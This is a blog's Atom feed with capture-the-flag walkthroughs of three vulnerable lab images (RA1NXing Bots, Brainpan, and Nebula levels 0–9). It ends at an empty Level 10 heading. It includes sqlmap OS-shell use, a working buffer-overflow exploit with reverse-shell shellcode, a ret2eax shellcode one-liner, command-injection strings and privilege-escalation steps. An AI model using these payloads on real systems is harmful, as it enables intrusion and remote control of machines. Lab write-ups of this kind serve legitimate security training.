<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: walkthrough | forelsec]]></title>
  <link href="http://hatRiot.github.io/blog/categories/walkthrough/atom.xml" rel="self"/>
  <link href="http://hatRiot.github.io/"/>
  <updated>2014-05-13T23:34:25-06:00</updated>
  <id>http://hatRiot.github.io/</id>
  <author>
    <name><![CDATA[Bryan Alexander]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[solving RA1NXing Bots]]></title>
    <link href="http://hatRiot.github.io/blog/2013/07/10/solving-ra1nxing-bots/"/>
    <updated>2013-07-10T23:31:29-06:00</updated>
    <id>http://hatRiot.github.io/blog/2013/07/10/solving-ra1nxing-bots</id>
    <content type="html"><![CDATA[<p><a href="http://vulnhub.com/entry/ra1nxing-bots_1,52/">RA1NXing Bots</a> is a vulnerable image intended to jump start security researches' interest in botnets and their exploitability.  This vulnerable image was brought to us by Brian Wallace (<a href="https://twitter.com/botnet_hunter">@botnet_hunter</a>), a botnet security researcher at Cylance and good friend (and Ballast Security co-founder).  This was a pretty interesting  vulnerable image, and good exposure into the sometimes seedy and malevolent world of botnets.</p>

<p>As such, the iconic nmap:</p>

<p>```</p>

<h1>Nmap 6.25 scan initiated Mon Jul  8 02:08:29 2013 as: nmap -sS -A -T5 -p- -oN bot.scan 192.168.1.198</h1>

<p>Nmap scan report for 192.168.1.198
Host is up (0.00044s latency).
Not shown: 65531 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 5.5p1 Debian 6+squeeze3 (protocol 2.0)
| ssh-hostkey: 1024 a2:24:9c:39:48:84:7f:da:1f:51:b9:0a:1b:45:df:aa (DSA)
|<em>2048 35:f5:0e:fa:c3:6b:98:8a:25:e1:f8:bf:de:38:82:03 (RSA)
80/tcp   open  http    Apache httpd 2.2.16 ((Debian))
|</em>http-methods: No Allow or Public header in OPTIONS response (status code 302)
| http-title: Site doesn&rsquo;t have a title (text/html).
|<em>Requested resource was /index.php?page=main
111/tcp  open  rpcbind 2-4 (RPC #100000)
| rpcinfo:
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|</em>  100000  2,3,4        111/udp  rpcbind
6667/tcp open  irc     IRCnet ircd
| irc-info: Server: irc.localhost
| Version: 2.11.2p2. irc.localhost 000A
| Lservers/Lusers: 0/3
| Uptime: 0 days, 0:10:37
| Source host: 192.168.1.147
|_Source ident: NONE or BLOCKED
MAC Address: 08:00:27:4B:51:94 (Cadmus Computer Systems)
Aggressive OS guesses: Linux 2.6.31 (98%), Linux 2.6.32 &ndash; 2.6.35 (97%), Linux 2.6.32 &ndash; 3.6 (96%), Netgear DG834G WAP or Western Digital WD TV media player (96%), Linux 2.6.17 &ndash; 2.6.36 (96%), Linux 2.6.23 &ndash; 2.6.38 (95%), Linux 2.6.22 (95%), Linux 2.6.18 &ndash; 2.6.21 (95%), AXIS 210A or 211 Network Camera (Linux 2.6) (95%), Linux 2.6.18 &ndash; 2.6.32 (94%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: Host: irc.localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>

<p>TRACEROUTE
HOP RTT     ADDRESS
1   0.44 ms 192.168.1.198</p>

<p>OS and Service detection performed. Please report any incorrect results at <a href="http://nmap.org/submit/">http://nmap.org/submit/</a> .</p>

<h1>Nmap done at Mon Jul  8 02:08:52 2013 &mdash; 1 IP address (1 host up) scanned in 23.34 seconds</h1>

<p>```</p>

<p>The two services of interest are the HTTP server and IRC.  The web server comprises a few links with some incredibly basic pages, one of which is an obvious front door at first glance:</p>

<p><img class="center <a" src="href="http://4.bp.blogspot.com/-5SaQmKH03_w/Ud4LthG_-AI/AAAAAAAAAgk/QzjHS8CoXNw/s640/login.jpg">http://4.bp.blogspot.com/-5SaQmKH03_w/Ud4LthG_-AI/AAAAAAAAAgk/QzjHS8CoXNw/s640/login.jpg</a>"></p>

<p>Grabbing the request and handing it off to sqlmap, we quickly have a shell:</p>

<p><code>
root@jali:~/lib_mysqludf_sys-master# sqlmap -u http://192.168.1.198/index.php?page=login --data 'user=blah&amp;password=blah' -p user --os-shell
[....]
[20:33:03] [INFO] the file stager has been successfully uploaded on '/var/www' - http://192.168.1.198:80/tmpufqvr.php
[20:33:03] [INFO] the backdoor has been successfully uploaded on '/var/www' - http://192.168.1.198:80/tmpbqsug.php
[20:33:03] [INFO] calling OS shell. To quit type 'x' or 'q' and press ENTER
os-shell&gt; whoami
do you want to retrieve the command standard output? [Y/n/a] a
command standard output:    'www-data'
os-shell&gt;
</code></p>

<p>Dumping out the kernel and listening services doesn&rsquo;t give us anything new.  A local mysql database was set up, and the root password was found in <code>/var/www/main.php</code>, but we can&rsquo;t UDF into it due to file restrictions.  Inside the web root is source for the web site, as well as a <code>/var/www/botsources</code>, which includes the source code for the Ra1nX bot.  This source will come in handy as we explore the system more thoroughly.</p>

<p>At the head of the bot we&rsquo;ve got a bunch of parameters defined; including its connection location and port:</p>

<p><code>
$servers        = "127.0.0.1";
$ports            = "6667";
$admins            = "";
$channels        = "#somechannel";
$realnames         = "jhl";
$nicknames         = "jhl1,jhl2,jhl3,jhl4,jhl5,jhl6,jhl7,jhl8,jhl9,jhl10,jhl11,jhl12,jhl13,jhl14,jhl15,jhl16,jhl17,jhl18,jhl19,jhl20,jhl21,jhl22,jhl23,jhl24,jhl25,jhl26,jhl27,jhl28,jhl29,jhl30";
$chanpass     = "trolol";
</code></p>

<p>If we attempt to connect to the IRC server and join the channel, we get <code>Cannot join to channel #somechannel (Bad channel key)</code>, which is the result of an incorrect password.  The source code specifies a password, but it doesn&rsquo;t work.  Could the bot be changed?</p>

<p><img class="center <a" src="href="http://3.bp.blogspot.com/-lR4idXiox9w/Ud4PQAVFmLI/AAAAAAAAAg0/GLEUZx8R9xE/s640/bot_root.jpg">http://3.bp.blogspot.com/-lR4idXiox9w/Ud4PQAVFmLI/AAAAAAAAAg0/GLEUZx8R9xE/s640/bot_root.jpg</a>"></p>

<p>Looks like some PHP script is being run as root; likely our culprit.  The issue now is communicating with the bot and somehow exploiting it to give us a root shell.  Time to hit that source we grabbed.</p>

<p>As given above, we have a list of nicknames, a channel, server, and password.  The password doesn&rsquo;t work, so we need to figure out another way.  The bot connects to the server using the connection() function, and selects a random nickname/server/port:</p>

<p>```
   while(!$SOCKET &amp;&amp; ($try &lt;= $maxtryconn)){</p>

<pre><code>    $server = random($servers);
    $port     = random($ports);
    $SOCKET = fsockopen($server,$port,$err_num,$err_msg,30);
    $GLOBALS['SOCKET']=$SOCKET;
    $try++;
    sleep(1);
}
if(!$SOCKET) die("Cannot connect to remote host");
if ($SOCKET){
    $GLOBALS['ident']     = $ident    = random($nicknames);
    $GLOBALS['nick']     = $nick     = random($nicknames);
    $GLOBALS['realname']= $realname    = random($realnames);
    SEND("USER XRay 127.0.0.1 localhost : -==Ra1NX Projection==-");
    NICK($nick);
    print "Connected to ".$server.":".$port." ".$nick." (XRay@".gethostbyname($_SERVER["HTTP_HOST"]).") Ra1NX Projection\r\n";
    flush();sleep(1);
}
</code></pre>

<p>```</p>

<p>Once connected to a server, it begins listening for commands.  Text is read off the socket and sent to the <code>parser</code> function, which then, obviously, parses and acts upon the input.  The interesting bit to us is the following snippet:</p>

<p>```
  if(substr($line[3],1,strlen($line[3]))==$nick){ $pubcalled = true; }</p>

<pre><code>if($pubcalled){
    if ($typeMsg=="PRIVMSG" &amp;&amp; $user &amp;&amp; $pubcalled &amp;&amp; $pubcmd) {
        if(function_exists($pubcmd)){
            $sender = "PRIVMSG ".$dropMsg." "._;
            $GLOBALS['sender'] = $sender;
            $arg = str_replace("\r","",$arg);
            $arg = str_replace("\n","",$arg);
            $pubcmd($arg);
        }
    }
}
</code></pre>

<p>```</p>

<p>Essentially, once parsed, a valid command to the bot appears <code>bot nick | @command | arguments</code>
It&rsquo;s also of interest that none of this code verifies the authenticity of the request, nor that it&rsquo;s even coming from a channel.  All we need to do, then, is log into the IRC server and iterate through all available nicknames until we find the connected bot.</p>

<p><img class="center <a" src="href="http://2.bp.blogspot.com/-mTV_DW3zLVk/Ud4Uu8woPnI/AAAAAAAAAhE/yb2drFOGxp0/s640/r00t.jpg">http://2.bp.blogspot.com/-mTV_DW3zLVk/Ud4Uu8woPnI/AAAAAAAAAhE/yb2drFOGxp0/s640/r00t.jpg</a>"></p>

<p>Game over.  Fun image, and looking forward to future botnet scenarios.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[solving brainpan]]></title>
    <link href="http://hatRiot.github.io/blog/2013/04/03/solving-brainpan/"/>
    <updated>2013-04-03T00:09:43-06:00</updated>
    <id>http://hatRiot.github.io/blog/2013/04/03/solving-brainpan</id>
    <content type="html"><![CDATA[<p>Brainpan is the brainchild of superkojiman over at vulnhub, and has some pretty interesting (and frustrating)  twists and turns.  This boot2root is more focused on exploitation of 0days in custom written software, with no metasploit modules or google hunting necessary.  With that, the nmap:</p>

<p>```
root@127:~# nmap -sS -A -p- -T5 192.168.1.110</p>

<p>Starting Nmap 6.25 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2013-03-27 22:06 CDT
Nmap scan report for brainpan (192.168.1.110)
Host is up (0.00040s latency).
Not shown: 65533 closed ports
PORT      STATE SERVICE VERSION
9999/tcp  open  abyss?
10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)
|<em>http-title: Site doesn&rsquo;t have a title (text/html).
| ndmp-version:
|</em>  ERROR: Failed to get host information from server
```</p>

<p>Port 10000 just serves up a page about various exploit statistics in web apps, but 9999 serves up a login page:</p>

<p>```
root@127:~# nc 192.168.1.110 9999
<em>|                            </em>|                                      <br/>
<em>|</em>|<em>|    </em>|  <em>|</em>|    <em>|</em>|<em>|      </em>|<em>|</em>|    <em>|</em>|<em>|      </em>|<em>|</em>|  <em>|</em>|<em>|<br/>
</em>|    <em>|  </em>|<em>|      </em>|    <em>|  </em>|  <em>|    </em>|  <em>|    </em>|  <em>|    </em>|  <em>|    </em>|
<em>|    </em>|  <em>|        </em>|    <em>|  </em>|  <em>|    </em>|  <em>|    </em>|  <em>|    </em>|  <em>|    </em>|
<em>|</em>|<em>|    </em>|          <em>|</em>|<em>|  </em>|  <em>|    </em>|  <em>|</em>|<em>|      </em>|<em>|</em>|  <em>|    </em>|</p>

<pre><code>                                        _|                          
                                        _|
</code></pre>

<p>[<strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong> WELCOME TO BRAINPAN </strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong>_]</p>

<pre><code>                      ENTER THE PASSWORD                              

                      &gt;&gt; whoareyou
                      ACCESS DENIED
</code></pre>

<p>root@127:~#
```</p>

<p>That&rsquo;s it.  I tried a few basic injections and default passwords to no avail.  I fired up DirBuster to see what I could find, and very quickly I stumped onto <code>/bin/</code>, which contained a single file, <code>brainpan.exe</code>.  I loaded this up into a debugger to see what was inside:</p>

<p><img class="center <a" src="href="http://4.bp.blogspot.com/-XGWNxG1FbCY/UVPCvoJc0LI/AAAAAAAAAbc/J-HSrap9_jw/s640/brainpan.jpg">http://4.bp.blogspot.com/-XGWNxG1FbCY/UVPCvoJc0LI/AAAAAAAAAbc/J-HSrap9_jw/s640/brainpan.jpg</a>"></p>

<p>It appeared that our password was <code>shitstorm</code>, following a strcpy of the incoming buffer.  I fired up the .exe in a VM to see what it did:</p>

<p><img class="center <a" src="href="http://4.bp.blogspot.com/-YnR2vlwbgIs/UVPDmWYEZWI/AAAAAAAAAbk/ZOLdSGpMovg/s640/brainpan_loaded.jpg">http://4.bp.blogspot.com/-YnR2vlwbgIs/UVPDmWYEZWI/AAAAAAAAAbk/ZOLdSGpMovg/s640/brainpan_loaded.jpg</a>"></p>

<p>Looks like this is just a copy of the program that is running in the virtual machine, and according to my registers, vulnerable:</p>

<p><img class="center <a" src="href="http://3.bp.blogspot.com/-uR5L_LXkS8o/UVPEtg3qFXI/AAAAAAAAAbs/zgjG9FTKst0/s640/brainpan_asploded.jpg">http://3.bp.blogspot.com/-uR5L_LXkS8o/UVPEtg3qFXI/AAAAAAAAAbs/zgjG9FTKst0/s640/brainpan_asploded.jpg</a>"></p>

<p>So it appears we need to attach to the login form and see if we can get it to explode with shell execution.  I find it interesting that we were given a copy of the file as a exe instead of an ELF, considering what the host is running.</p>

<p>Exploiting this particular binary was not hard, but I ran into an issue that made it more difficult than it should&rsquo;ve been.  This is a very straightforward stack-based buffer overflow, but continually my stack would get corrupted and shift by one or two bytes:</p>

<p><img class="center <a" src="href="http://2.bp.blogspot.com/-c19Y3eKE7cE/UVWx2YwTsrI/AAAAAAAAAb8/Rg-_YzDb8n4/s640/wat.jpg">http://2.bp.blogspot.com/-c19Y3eKE7cE/UVWx2YwTsrI/AAAAAAAAAb8/Rg-_YzDb8n4/s640/wat.jpg</a>"></p>

<p>To mitigate this, instead of my payload looking like this: <code>[524 bytes of junk | JMP ESP | NOPs | shellcode]</code></p>

<p>I had to jump a little further back to take advantage of some extra instructions: <code>[520 bytes of junk | 4 NOP bytes | PUSH EBP; MOV EBP,ESP JMP ESP | NOPs | shellcode]</code></p>

<p>This aligned my stack properly and allowed me to run a reverse shell.  Here&rsquo;s the exploit:</p>

<p>```
import socket</p>

<h1>msfpayload linux/x86/shell_reverse_tcp LHOST=192.168.1.74 LPORT=443 R | msfencode -e x86/shikata_ga_nai -t c</h1>

<h1>[*] x86/shikata_ga_nai succeeded with size 95 (iteration=1)</h1>

<p>shell = &ldquo;\xdb\xc8\xbf\x12\xad\xd5\x16\xd9\x74\x24\xf4\x58\x29\xc9\xb1&rdquo;\</p>

<pre><code>    "\x12\x31\x78\x17\x03\x78\x17\x83\xfa\x51\x37\xe3\xcb\x72\x4f"\
    "\xef\x78\xc6\xe3\x9a\x7c\x41\xe2\xeb\xe6\x9c\x65\x98\xbf\xae"\
    "\x59\x52\xbf\x86\xdc\x95\xd7\xd8\xb7\x67\x6d\xb1\xc5\x67\x70"\
    "\xfa\x43\x86\xc2\x9a\x03\x18\x71\xd0\xa7\x13\x94\xdb\x28\x71"\
    "\x3e\xcb\x07\x05\xd6\x7b\x77\x8b\x4f\x12\x0e\xa8\xdd\xb9\x99"\
    "\xce\x51\x36\x57\x90";
</code></pre>

<p>try:</p>

<pre><code>payload = '\x41' * 520        #junk
payload += '\x90'*4           #ebp
payload += '\xf0\x12\x17\x31' #push ebp; mov ebp,esp; jmp esp
payload += '\x90'*50          #nop sled
payload += shell              #shellcode

s = socket.socket()
s.connect(('192.168.1.110', 9999))
s.recv(1024)
s.send(payload)
</code></pre>

<p>except Exception, e: print e
```</p>

<p>I then had a connected shell waiting for me on 192.168.1.74; a bit of enumeration:</p>

<p><code>
$ whoami  
puck
$ uname -a
Linux brainpan 3.5.0-25-generic #39-Ubuntu SMP Mon Feb 25 19:02:34 UTC 2013 i686 i686 i686 GNU/Linux
$ id
uid=1002(puck) gid=1002(puck) groups=1002(puck)
$ ls /home/
anansi
puck
reynard
</code></p>

<p>To ease my curiousity about the ELF/EXE web server running:</p>

<p>```
$ cat /home/puck/checksrv.sh</p>

<h1>!/bin/bash</h1>

<h1>run brainpan.exe if it stops</h1>

<p>lsof -i:9999
if [[ $? -eq 1 ]]; then</p>

<pre><code>pid=`ps aux | grep brainpan.exe | grep -v grep`
if [[ ! -z $pid ]]; then
    kill -9 $pid
    killall wineserver
    killall winedevice.exe
fi
/usr/bin/wine /home/puck/web/bin/brainpan.exe &amp;
</code></pre>

<p>fi</p>

<h1>run SimpleHTTPServer if it stops</h1>

<p>lsof -i:10000
if [[ $? -eq 1 ]]; then</p>

<pre><code>pid=`ps aux | grep SimpleHTTPServer | grep -v grep`
if [[ ! -z $pid ]]; then
    kill -9 $pid
fi
cd /home/puck/web
/usr/bin/python -m SimpleHTTPServer 10000
</code></pre>

<p>fi
```</p>

<p>It&rsquo;s not actually an elf, but an exe that&rsquo;s running under WINE.  Another interesting bit:</p>

<p><code>
$ which gcc
$ which cc
$ which gdb
$ which objdump
</code></p>

<p>So if we happen to find any more binaries to exploit, we need to hack on it blind.  And in this case&hellip;</p>

<p><code>
$ find / -perm +6000 -type f -exec ls -ld {} \; &gt; setuid; echo done
$ cat setuid
-rwsr-xr-x 1 root root 63632 Sep  6  2012 /bin/umount
-rwsr-xr-x 1 root root 31124 Sep  6  2012 /bin/su
-rwsr-xr-x 1 root root 88768 Sep  6  2012 /bin/mount
-rwsr-xr-x 1 root root 30112 Jun 11  2012 /bin/fusermount
-rwsr-xr-x 1 root root 39124 Oct  2 17:26 /bin/ping6
-rwsr-xr-x 1 root root 34780 Oct  2 17:26 /bin/ping
-rwxr-sr-x 1 root tty 18056 Sep  6  2012 /usr/bin/wall
-rwsr-xr-x 2 root root 115140 Feb 27 14:27 /usr/bin/sudo
-rwxr-sr-x 1 root shadow 45292 Sep  6  2012 /usr/bin/chage
-rwxr-sr-x 1 root crontab 34784 Jun 14  2012 /usr/bin/crontab
-rwsr-xr-x 1 root root 60344 Jun 18  2012 /usr/bin/mtr
-rwxr-sr-x 1 root mail 13944 Jun 14  2012 /usr/bin/dotlockfile
-rwsr-xr-x 1 root root 30936 Sep  6  2012 /usr/bin/newgrp
-rwsr-xr-x 1 root root 31756 Sep  6  2012 /usr/bin/chsh
-rwxr-sr-x 1 root mlocate 34452 Aug 14  2012 /usr/bin/mlocate
-rwxr-sr-x 1 root shadow 18128 Sep  6  2012 /usr/bin/expiry
-rwxr-sr-x 1 root tty 9736 Jun 18  2012 /usr/bin/bsd-write
-rwsr-xr-x 2 root root 115140 Feb 27 14:27 /usr/bin/sudoedit
-rwsr-xr-x 1 root root 40300 Sep  6  2012 /usr/bin/chfn
-rwxr-sr-x 3 root mail 9704 Oct  2 17:32 /usr/bin/mail-lock
-rwsr-xr-x 1 root root 14020 Oct  2 17:26 /usr/bin/traceroute6.iputils
-rwsr-sr-x 1 daemon daemon 46576 Jun 11  2012 /usr/bin/at
-rwsr-xr-x 1 root lpadmin 13672 Dec  4 09:21 /usr/bin/lppasswd
-rwxr-sr-x 3 root mail 9704 Oct  2 17:32 /usr/bin/mail-touchlock
-rwsr-xr-x 1 root root 41292 Sep  6  2012 /usr/bin/passwd
-rwsr-xr-x 1 root root 57964 Sep  6  2012 /usr/bin/gpasswd
-rwxr-sr-x 3 root mail 9704 Oct  2 17:32 /usr/bin/mail-unlock
-rwxr-sr-x 1 root ssh 128424 Sep  6  2012 /usr/bin/ssh-agent
-rwsr-sr-x 1 libuuid libuuid 17996 Sep  6  2012 /usr/sbin/uuidd
-rwsr-xr-- 1 root dip 301944 Sep 26  2012 /usr/sbin/pppd
**-rwsr-xr-x 1 anansi anansi 8761 Mar  4 11:06 /usr/local/bin/validate**
-rwsr-xr-- 1 root messagebus 317564 Oct  3 16:00 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 248064 Sep  6  2012 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 5452 Jun 25  2012 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 9740 Oct  3 21:46 /usr/lib/pt_chown
-rwxr-sr-x 1 root shadow 30372 Jul  3  2012 /sbin/unix_chkpwd
</code></p>

<p>The bolded entry in our list appears to be suid one of the other users, so it&rsquo;s likely we&rsquo;ll need to attack this one.  And, as mentioned earlier, we have zero debugging tools.  To make matters even worse:</p>

<p><code>
$ cat /proc/sys/kernel/randomize_va_space
2
</code></p>

<p>This means full address space layout randomization is enabled.  This should be fun without debugging tools.</p>

<p>One solution (and one my good friend @mulitia used) is to put shellcode into an environmental variable, netcat over a binary for finding its address, then spamming VAS with that address.  This is a brute-force method that works, but in a real environment might not be the most stealthy of ways.  Another way is to make use of a JMP [register] (say, one we control) and move execution to shellcode space.  If we objdump the binary and hunt for JMP, there are none which point to registers.  Another option is CALL, which is essentially a macro to push/jmp:</p>

<p><code>
root@bt:~/brainpan# objdump -M intel -d validate | grep "call"
 8048353:    e8 00 00 00 00           call   8048358 &lt;_init+0xc&gt;
 8048369:    e8 1e 00 00 00           call   804838c &lt;__gmon_start__@plt&gt;
 804836e:    e8 1d 01 00 00           call   8048490 &lt;frame_dummy&gt;
 8048373:    e8 98 02 00 00           call   8048610 &lt;__do_global_ctors_aux&gt;
 804841c:    e8 7b ff ff ff           call   804839c &lt;__libc_start_main@plt&gt;
 8048468:    ff 14 85 14 9f 04 08     call   DWORD PTR [eax*4+0x8049f14]
 80484af:    ff d0                    call   eax
 80484f3:    e8 d4 fe ff ff           call   80483cc &lt;printf@plt&gt;
 80484ff:    e8 e8 fe ff ff           call   80483ec &lt;exit@plt&gt;
 8048511:    e8 96 fe ff ff           call   80483ac &lt;strlen@plt&gt;
 8048527:    e8 90 fe ff ff           call   80483bc &lt;strcpy@plt&gt;
 8048558:    e8 6f fe ff ff           call   80483cc &lt;printf@plt&gt;
 804856c:    e8 5b fe ff ff           call   80483cc &lt;printf@plt&gt;
 804857c:    e8 33 ff ff ff           call   80484b4 &lt;validate&gt;
 8048593:    e8 44 fe ff ff           call   80483dc &lt;puts@plt&gt;
 80485b6:    e8 4f 00 00 00           call   804860a &lt;__i686.get_pc_thunk.bx&gt;
 80485c4:    e8 83 fd ff ff           call   804834c &lt;_init&gt;
 80485f4:    ff 94 b3 18 ff ff ff     call   DWORD PTR [ebx+esi*4-0xe8]
 804862b:    ff d0                    call   eax
 8048643:    e8 00 00 00 00           call   8048648 &lt;_fini+0xc&gt;
 804864f:    e8 dc fd ff ff           call   8048430 &lt;__do_global_dtors_aux&gt;
root@bt:~/brainpan#
</code></p>

<p>Two options here!  Let&rsquo;s see if we control EAX&hellip;</p>

<p>```
root@bt:~/brainpan# gdb ./validate
Reading symbols from /root/brainpan/validate&hellip;done.
(gdb) r $(perl -e &lsquo;print &ldquo;\x41"x120&rsquo;)
Starting program: /root/brainpan/validate $(perl -e &lsquo;print &rdquo;\x41"x120&rsquo;)
warning: the debug information found in &ldquo;/lib/ld-2.11.1.so&rdquo; does not match &ldquo;/lib/ld-linux.so.2&rdquo; (CRC mismatch).</p>

<p>Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) x/x $eax
0xffffd3e8:    0x41414141
(gdb)
```</p>

<p>Great, we can now leverage a ret2eax attack.  We&rsquo;ll just need to fill up the required 116 bytes prior to the EIP overwrite, then fill that with our CALL EAX:</p>

<p><code>
$ ./validate $(perl -e 'print "\xbe\x1f\x41\x25\xe8\xd9\xed\xd9\x74\x24\xf4\x5b\x2b\xc9\xb1\x0c\x83\xc3\x04\x31\x73\x0f\x03\x73\x10\xa3\xd0\x82\x25\x7b\x82\x01\x5f\x13\x99\xc6\x16\x04\x89\x27\x5b\xa3\x4a\x50\xb4\x51\x22\xce\x43\x76\xe6\xe6\x59\x79\x07\xf7\x72\x1b\x6e\x99\xa3\xbf\x11\x16\xd3\x3f\x85\x8b\xaa\xa1\xe4\xac" . "\x90"x44 . "\x2b\x86\x04\x08"')
$ whoami
anansi
</code></p>

<p>Success; another local user.  I&rsquo;d like to briefly note that I had alot of issues getting shellcode to work if it was placed after the NOP sled, as opposed to before.</p>

<p>Now that we&rsquo;ve got our second account, we can hunt around the system in search of more binaries to exploit.  As our prior search discovered, nothing is suid root.  Checking out /home/anansi gives us:</p>

<p><code>
$ pwd &amp;&amp; ls -lh
/home/anansi/bin
total 8.0K
-rwxr-xr-x 1 anansi anansi 7.1K Mar  4 10:58 anansi_util
$ ./anansi_util
Usage: ./anansi_util [action]
Where [action] is one of:
  - network
  - proclist
  - manual [command]
</code></p>

<p>I couldn&rsquo;t find any segmentation faults with this, but I did note the following:</p>

<p>```
$ sudo -l
Matching Defaults entries for puck on this host:</p>

<pre><code>env_reset, mail_badpass,
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
</code></pre>

<p>User puck may run the following commands on this host:</p>

<pre><code>(root) NOPASSWD: /home/anansi/bin/anansi_util
</code></pre>

<p>```</p>

<p>It would appear we can <code>sudo ./anansi_util</code> without the need for a password.  And we own the binary!</p>

<p><code>
$ mv anansi_util anansi_util_bkp
$ ln -s /bin/sh ./anansi_util
$ ls -lh
total 8.0K
lrwxrwxrwx 1 anansi puck      7 Mar 31 15:27 anansi_util -&gt; /bin/sh
-rwxr-xr-x 1 anansi anansi 7.1K Mar  4 10:58 anansi_util_bkp
$ sudo ./anansi_util
$ whoami
root
</code></p>

<p>One of the more interesting boot2root&rsquo;s I&rsquo;ve had the privilege of exploiting, and a trend I hope to see continue.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Nebula Solutions - All Levels]]></title>
    <link href="http://hatRiot.github.io/blog/2013/03/30/nebula-solutions-all-levels/"/>
    <updated>2013-03-30T23:46:33-06:00</updated>
    <id>http://hatRiot.github.io/blog/2013/03/30/nebula-solutions-all-levels</id>
    <content type="html"><![CDATA[<p>Nebula is the first of three exploit discs provided by <a href="http://exploit-exercises.com/">exploit exercises</a>.  I&rsquo;ve seen a couple walkthroughs of these levels around, but as a completionist, and for future reference, I&rsquo;ve cleaned my notes up a bit and am posting them here.  I will also post my notes for the other two systems sometime after.  This post includes a walkthrough of all 20 levels.</p>

<h3>Level 00</h3>


<p>Introduction level; requires the user to find a setuid file.  <code>find / -perm +6000 -type f -exec ls -ldh {} \; &gt; files.txt</code> and <code>cat files.txt | grep flag00</code> gives us two files, <code>/bin/.../flag00</code> and <code>/rofs/bin/.../flag00</code>.  Pick one and get your flag.</p>

<h3>Level 01</h3>


<p>First &ldquo;real&rdquo; level.  A binary with an environmental vulnerability; the source code given clearly lays out that its loading the users environment, and running echo with a string.  By modifying our environmental PATH, we can &ldquo;search&rdquo; for echo first in another directory and launch a shell.  <code>export PATH=/tmp:$PATH</code> to search for binaries in /tmp first, then create a shell script that launches bash.  Flag captured.</p>

<h3>Level 02</h3>


<p>Much like the previous level, this involves the manipulation of environmental variables.  Here it&rsquo;s pulling <code>$USER</code> and inserting it into a string to echo out.  Because we control this variable, we can terminate the string and execute a shell with the following: <code>export USER="test &amp;&amp; /bin/bash &amp;&amp; echo"</code>.  Launch the binary and capture the flag.</p>

<h3>Level 03</h3>


<p>This level has a crontab that runs every 5 minutes, and executes anything found in the local <code>writable.d</code> folder, then removes it.  It, surprise, runs as our flag.  If we shove a malicious script into the run folder that generates a shell executable for us, we should be able to suid it and capture our flag.  Generate a shell script with the following in writable.d:</p>

<p>```</p>

<h1>!/bin/bash</h1>

<p>gcc /tmp/shell.c -o /home/flag03/shell
chmod +s /home/flag03/shell
<code>``
You'll just need to create</code>shell.c<code>in tmp and wait for it to run; I took the source code from level 1 and changed the system command to execute /bin/bash instead.  Execute</code>chmod +x` on run.sh and wait for your binary to be generated.  Once it is, execute it for your flag.  One thing to note is that it would be much easier to echo a shell script and suid that; alas, Linux prevents us from suid'ing scripts, <a href="http://www.faqs.org/faqs/unix-faq/faq/part4/section-7.html">and for very good reason</a>.</p>

<h3>Level 04</h3>


<p>Here we have another executable binary and a token file, which we must read.  The binary reads a name from stdin, checks if it&rsquo;s called &ldquo;token&rdquo; and if so, exits, otherwise it reads the file.  To circumvent this simple test, we can create a symbolic link to the token file and read that instead.  Executing <code>ln -s /home/flag04/token /tmp/test</code> allows us to then read /tmp/test and dump the token file.  In it is the password for flag04.</p>

<h3>Level 05</h3>


<p>This level aims to educate the user on directory permissions.  Browsing to <code>/home/flag05</code> and <code>ls -lAh</code> gives us several hidden folders, including a .backup folder with a tar file.  If we untar this, it appears to be a backup of flag05&rsquo;s ssh directory.  Copying the private key over will allow us to SSH in and capture our fifth flag.</p>

<h3>Level 06</h3>


<p>The informational page notes that this flag&rsquo;s credentials came from a legacy Unix system.  Executing <code>cat /etc/passwd | grep flag06</code> gives us a traditional DES encrypted password.  Loading this into john the ripper cracks the flag&rsquo;s password, giving us our sixth flag.</p>

<h3>Level 07</h3>


<p>Level 7 has a web server running on port 7007 that hosts a simple ping application.  No sanitation is performed on input, so obviously its prone to injection.  Leveraging the shell we wrote for level 3, we can simply generate a new shell script to compile and suid the binary.  By setting Host equal to <code>192.168.1.1 | sh /tmp/run2.sh</code>, we&rsquo;ll generate our shell and capture the flag.</p>

<h3>Level 08</h3>


<p>This level has a single pcap file with, likely. a password somewhere.  I scp&rsquo;d this off so I could parse it in Wireshark, but it could also be done using <code>tcpdump -qns 0 -X -r capture.pcap | more</code>.  Opening the pcap gives us a login attempt with a password backdoor&hellip;00Rm8.ate.  The periods are represented by <code>\x7f</code>, which just so happens to be backspace.  su to flag08 and capture the flag.</p>

<h3>Level 09</h3>


<p>This level requires some prerequisite knowledge of PHP and an edge-case vulnerability.  When <a href="http://php.net/manual/en/function.preg-replace.php">pre_replace</a> is used with the /e flag, the replacement string is substituted, evaluated, and replaced in the original string.  By looking at the PHP source code, we see the following <code>$contents = preg_replace("/(\[email (.*)\])/e", "spam(\"\\2\")", $contents);</code>.  This regex matches the pattern <code>[email EMAIL]</code>, where EMAIL will be evaluated by the spam function, then eval&rsquo;d by PHP.  Notice the function takes two arguments, but only uses one; a clue, by any means.</p>

<p>In order to exploit this, we need to set the email portion of the regex to spawn us a shell.  This can be done with the following entry: <code>([email {${system($use_me)}}])</code>, where $use_me is $argv[2] to the executable.  Wrapping the command in <code>${system}</code> allows the PHP engine to interpret the command properly, and the extra pair of curly braces for escaping.  Pass in /bin/bash to capture your flag.</p>

<h3>Level 10</h3>


